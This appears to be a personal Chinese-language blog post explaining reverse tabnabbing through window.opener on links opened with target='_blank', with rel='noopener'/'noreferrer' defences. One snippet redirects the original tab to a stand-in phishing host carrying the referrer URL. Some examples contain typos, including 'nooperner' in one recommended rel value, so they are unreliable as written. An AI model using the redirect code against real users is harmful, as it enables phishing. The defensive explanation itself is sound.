---
title: a标签opener的危险
date: 2019-06-03 20:54:31
tags: web安全
categories: 
- 前端
---


>本篇博客仅以个人学习记录使用

### 起源

我们知道，在iframe中提供了一个用于父子页面交互的现象，叫做window.parent,我们可以通过这个对象来从框架汇总的页面访问父级页面的window。
opener与parent一样，只不过是用于在新标签页打开的页面的。通过a标签打开的页面，可以直接使用window.opener来访问来源页面的window对象。

```
<a target="_blank">

```

### 同域和跨域

浏览器提供了完整的跨域保护，在域名相同时，parent对象和opener对象实际上就直接是上一级的window对象；而当域名不同时，则是经过包装的一个global对象，并且在这几个仅有的属性中，大部分也都是不允许访问的（访问会直接抛出DOMException）
在iframe中，提供了一个sandbox属性用于控制框架中的页面的权限，因此即使是同域，也可以控制iframe的安全性

### 利用

如果，你的网站上有一个链接，使用了target="_blank",那么一旦用户点击了这个链接并进入一个新的标签，新标签中的页面如果存在恶意代码，就可以将你的网站直接导航到一个虚假网站。此时，如果用户回到你的标签页，看到的就是被替换过的页面了。

### 详细步骤

1：在你的网站上存在一个链接

```
<a href=""https://an.evil.site"  target="_blank">进入一个邪恶的网站</a>
```

2:用户点击了这个链接，在新的标签页打开了这个网站。这个网站可以通过HTTP Header 中的Referer属性来判断用户的来源。并且，这个网站上包含着类似于这样的Js代码:

```
const url = encodeUrIComponent('{{header.refer}}');
window.opener.location.replace('https://a.fake.site/?' + url);
```

1.此时，用户在继续浏览这个新的标签页，而原来的网站所在的标签页此时已经被导航到了xxxx

2.恶意网站xxx根据query string 来伪造一个足以欺骗用户的页面，并展示出来（期间还可以做一次跳转，使得浏览器的地址栏更具有迷惑性）

3.用户关闭xxx的标签页，回到原来的网站，已经回不去了

上部分攻击是在跨域的情况下的，在跨域情况下，opener对象和parent一样，是受限制的，仅提供非常有限的属性访问，大部分也都是不予许访问的（访问会直接抛出DOMException）

但是与parent不同的是，在跨域的情况下，opener仍然可以调用location.replace方法而parent不能
*** 如果是在同域的情况下，情况要比上面的严重的多

### 防御

```
<iframe>中用sandbox属性，而链接，则可以使用下面的方法:
1.Referrer Policy 和 noreferrer
上面的攻击中步骤中，用到了HTTP Header中的Referer属性，实际上可以在HTTP的响应头中增加Referrer Policy 头来保证来源隐私安全。

```

```
<a href="https://an.evil.site" target="_blank" rel="noreferrer">进入一个邪恶的网站</a>
但是要注意的是：即使限制了referer的传递，仍然不能阻止原标签被恶意跳转

```

2.noopener

为了安全，现代浏览器都支持在a标签的rel属性中指定rel="noopener",这样，在打开的新标签页中，将无法使用opener对象了，它设置为了null.

```
<a href="https://an.evil.site" target="_blank" rel="noopener">进入一个邪恶的网站</a>
```

3.JS

noopener属性看似解决了所有的问题，但是，浏览器还存在兼容性问题。。。
这时就需要加上这段原生JavaScript来帮忙了

```
function openUrl(url) {
    var newTab = window.open();
    newTab.opener = null;
    newTab.location = url;
}
```

### 推荐

首先在网站中的链接上 ，如果使用了target="_blank",就要带上rel="noopener",并且建议带上rel="noreferrer"。类似于这样：

```
<a href="https://an.evil.site" target="_blank" rel="nooperner noreferrer">进入一个邪恶的网站</a>
```

当然，在跳转到第三方网站的时候，为了SEO权重，还建议带上rel="nofollow",所以最终类似于这样:

```
<a href="https://an.evil.site" target="_blank" rel="noopener noreferrer nofollow"> 进入一个邪恶的网站</a>
```

### 性能

最后，再来说说性能问题。
如果网站使用了target="_blank",那么新打开的标签页的性能将会影响到当前页面。此时如果新打开的页面中执行了一个非常庞大的Js脚本，那么原始标签页也会受到影响，会出现卡顿的现象，而如果在连接中加入了noopener,则此时两个标签页将会互补干扰，使得原页面的性能不会受到新页面的影响
